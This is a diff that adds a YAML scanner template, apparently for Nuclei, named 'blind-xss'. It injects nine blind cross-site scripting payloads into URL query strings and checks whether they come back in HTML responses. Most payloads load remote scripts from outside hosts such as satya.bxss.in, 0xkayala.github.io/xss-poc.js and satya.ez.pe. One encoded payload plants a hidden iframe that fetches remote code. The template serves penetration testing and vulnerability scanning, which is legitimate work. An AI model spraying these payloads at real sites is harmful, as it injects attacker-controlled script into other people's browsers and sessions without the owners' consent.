@@ -1,0 +1,64 @@
+id: blind-xss
+
+info:
+  name: Blind Cross Site Scripting
+  author: 0xKayala
+  severity: high
+  description: This template will spray blind XSS payloads into URLs. Use 'xss.report', 'bxsshunter.com', 'xsshunter.trufflesecurity.com', 'ez.pe' or 'self-hosted server' to check if the payload fired.
+  tags: xss,bxss,dast
+
+variables:
+  first: "{{rand_int(10000, 99999)}}"
+  script_payload_1: "<script>$.getScript(\"//satya.bxss.in\")</script>"
+  script_payload_2: "</script><script%20/src=//0xkayala.github.io/xss-poc.js></script>\"><41707"
+  script_payload_3: "<script /src=//0xkayala.github.io/xss-poc.js></script>"
+  script_payload_4: "<script src=\"//0xkayala.github.io/xss-poc.js\"></script>"
+  script_payload_5: "</script><script src='https://satya.ez.pe'></script>"
+  script_payload_6: "<script src=//satya.ez.pe></script>"
+  script_payload_7: "\u0022\u003cimg\u0020src\u003dx\u0020onerror\u003d\u0022confirm(document.domain)\u0022\u003e"
+  script_payload_8: "%3Cdiv%20id%3D%22load%22%3E%3C%2Fdiv%3E%3Cscript%3Evar%20i%20%3D%20document.createElement%28%27iframe%27%29%3B%20i.style.display%20%3D%20%27none%27%3B%20i.onload%20%3D%20function%28%29%20%7B%20i.contentWindow.location.href%20%3D%20%27%2F%2F0xkayala.github.io/xss-poc.js%27%3B%20%7D%3B%20document.getElementById%28%27load%27%29.appendChild%28i%29%3B%3C%2Fscript%3E"
+  script_payload_9: "XX"></SCRIPT><embed src=//14.rs>"
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}"
+
+    payloads:
+      blind:
+        - "{{script_payload_1}}"
+        - "{{script_payload_2}}"
+        - "{{script_payload_3}}"
+        - "{{script_payload_4}}"
+        - "{{script_payload_5}}"
+        - "{{script_payload_6}}"
+        - "{{script_payload_7}}"
+        - "{{script_payload_8}}"
+        - "{{script_payload_9}}"
+
+    fuzzing:
+      - part: query
+        type: postfix
+        mode: single
+        fuzz:
+          - "{{blind}}"
+
+    stop-at-first-match: true
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "{{script_payload_1}}"
+          - "{{script_payload_2}}"
+          - "{{script_payload_3}}"
+          - "{{script_payload_4}}"
+          - "{{script_payload_5}}"
+          - "{{script_payload_6}}"
+          - "{{script_payload_7}}"
+          - "{{script_payload_8}}"
+          - "{{script_payload_9}}"
+      - type: word
+        part: header
+        words:
+          - "text/html"
